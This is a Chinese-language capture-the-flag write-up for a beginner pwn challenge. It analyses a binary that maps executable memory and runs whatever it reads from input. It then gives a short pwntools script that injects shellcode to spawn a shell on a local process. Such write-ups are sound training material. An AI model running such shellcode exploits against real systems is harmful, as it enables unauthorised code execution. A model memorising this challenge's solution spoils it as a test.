# 简单的shellcode

- 作者：pn1fg
- 参考：-
- 难度：Normal
- 分类：Pwn
- 镜像：[svuctf-helloworld-2023/shellcode](https://ghcr.io/svuctf/svuctf-helloworld-2023/shellcode)
- 端口：70

# 题目描述

-

# 题目解析

- 源码：[shellcode.c](build/shellcode.c)
- 考点：写shellcode

`shellcode` 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 `shel`l。一般来说，shellcode 需要我们自己填充，要想执行`shellcode`，需要对应的 `binary`在运行时，`shellcode`所在的区域具有可执行权限。

______________________________________________________________________

#### 查看文件信息

查看文件类型：

```shell
>>> file shellcode
shellcode: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=e4a67a1f629c4ad7e86b6fd9e87a1bceccf80f7d, for GNU/Linux 3.2.0, not stripped
```

这是一个64位 ELF 文件，动态链接，没有去除符号

查看保护机制：

```shell
>>> checksec --file=shellcode
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

NX 保护

#### 分析漏洞成因

反编译`vuln`函数

```c
void sym.vuln(void)

{
    code *pcVar1;
    ulong buf;

    pcVar1 = sym.imp.mmap(0, 0x400, 7, 0x22, 0, 0);
    sym.imp.puts("Please Send !!!!");
    sym.imp.read(0, pcVar1, 0x400);
    (*pcVar1)();
    return;
}
```

这个`mmap`函数可能大家都不太熟悉，可以去了解一下这个函数的作用

`mmap`函数在本题中的作用是，将`pcVar1`指针指向的区域中大小为 0x400 的内存赋予可读可写可执行的权限，`read`函数从标准输入读取 0x400 的数据存入刚刚指针指向的区域

所以本题的大致思路就是，通过`read`函数我们将一段`shellcode`写入内存中并且执行它从而拿到`shell`

#### 编写利用程序

[exp.py](writeup/exp.py):

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

io = process('./shellcode')

shellcode = asm(shellcraft.sh()) 

payload = flat([shellcode,])

io.sendlineafter(b'!\n',payload)

io.interactive()
```
